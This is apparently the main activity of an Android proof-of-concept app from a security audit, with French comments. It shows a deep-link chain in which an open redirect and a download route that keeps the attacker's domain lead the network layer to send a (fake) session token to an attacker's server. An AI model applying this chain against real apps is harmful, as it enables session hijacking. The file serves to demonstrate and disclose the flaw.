package com.hdwsec.formaepoc

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.ScrollView
import android.widget.TextView
import kotlin.concurrent.thread

class MainActivity : Activity() {

    // Le jeton de session de la victime. Dans la vraie app, il est ajouté
    // AUTOMATIQUEMENT par la couche réseau à chaque requête sortante (voir ApiClient).
    // Ici on le code en dur pour la démo : faux JWT, aucune donnée réelle.
    private val fakeAccessToken =
        "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.POC_FORMAE_DEMO.0xC0FFEE"

    private lateinit var out: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        out = TextView(this).apply {
            setPadding(40, 56, 40, 56)
            textSize = 13f
            setTextIsSelectable(true)
        }
        setContentView(ScrollView(this).apply { addView(out) })

        val data = intent?.data
        if (intent?.action == Intent.ACTION_VIEW && data != null) {
            runChain(data)
        } else {
            line("Formae — démonstration de vol de jeton via deep link\n")
            line("Cette application de test reproduit la faille trouvée en audit.\n")
            line("Pour la déclencher : depuis ce téléphone, ouvrez la page servie par")
            line("le serveur récepteur, puis tapez le lien piégé.\n")
            line("(Jeton de démonstration factice, aucune donnée réelle n'est manipulée.)")
        }
    }

    private fun runChain(link: Uri) {
        line("Lien ouvert par l'application :")
        line("  $link\n")

        // Étape 1 — redirection ouverte
        val redirect = VulnerableRouter.resolveOpenRedirect(link)
        if (redirect == null) {
            line("Route inconnue, rien à faire.")
            return
        }
        line("[1] Redirection ouverte  (/api/track/click)")
        line("    on suit le paramètre url sans valider le domaine :")
        line("    $redirect\n")

        // Étape 2 — route de téléchargement qui recycle le domaine d'entrée
        val downloadUrl = VulnerableRouter.resolveCertificateDownload(redirect)
        if (downloadUrl == null) {
            line("L'URL ne correspond pas à la route certificat.")
            return
        }
        line("[2] Téléchargement du certificat")
        line("    la route garde le domaine fourni (celui de l'attaquant) :")
        line("    $downloadUrl\n")

        // Étape 3 — la couche réseau attache le Bearer à TOUTE requête
        line("[3] Envoi de la requête. La couche réseau attache le jeton...")
        thread {
            val result = ApiClient.download(downloadUrl, fakeAccessToken)
            runOnUiThread {
                line("    Authorization: Bearer ${fakeAccessToken.take(28)}...")
                line("\n=> $result")
                line("\nLe jeton de session vient de partir chez l'attaquant.")
            }
        }
    }

    private fun line(s: String) = out.append(s + "\n")
}
